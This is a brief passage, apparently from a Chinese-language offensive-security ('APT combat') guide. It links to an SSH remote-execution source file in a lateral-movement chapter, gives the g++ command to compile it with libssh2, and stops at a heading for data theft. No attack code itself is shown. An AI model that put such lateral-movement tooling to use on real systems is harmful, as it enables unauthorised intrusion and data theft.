[ssh_execute.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/ssh_execute.cpp)

```bash
g++ ssh_execute.cpp -o ssh_execute -lssh2
```

## 数据窃取
